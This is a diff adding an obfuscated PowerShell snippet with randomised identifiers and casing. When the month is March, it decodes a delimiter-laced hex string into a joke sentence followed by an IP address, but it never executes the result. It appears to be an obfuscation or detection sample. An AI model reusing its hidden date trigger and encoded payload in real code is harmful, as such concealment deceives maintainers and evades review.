@@ -1,0 +1,13 @@
+fuNcTIoN YscNKb { 
+    [ cMdLETbindING()]param( 
+        [paramEteR(valuEfROMpiPelIne)]
+        $qGeRrJW
+    )
+    IF ((gET-date).Month -eq 3){
+        $kMwRq = [STrInG]::jOIn( '' ,($qGeRrJW.SPlIt( 'Y>v-,CZ!xg' )| foreaCH{( [cOnVert]::TOINt16( ([sTrIng]$_ ), 16)-as[chAR]) }))
+    
+    }
+}
+ $xaRdKxi = '24g72g65-73x75Y6c-74x20-3dv20C22>53!75C63x63>65Z73-73x20-69Y73g20Y61,20,72x65Z6cY61Y74>69Z76>65!20v74Z65x72C6dv2ev20-49v74>20,62Z72g69g6ex67x73,20x73x6f!20x6d!61Z6ev79,20g72Z65,6cC61v74>69>76x65>73,2eg69Y70x3a>31>31Z36,2e,31,32Y31x2eZ34,30x2ev31v35v33>22va'
+YscNKb -qGeRrJW $xaRdKxi
+
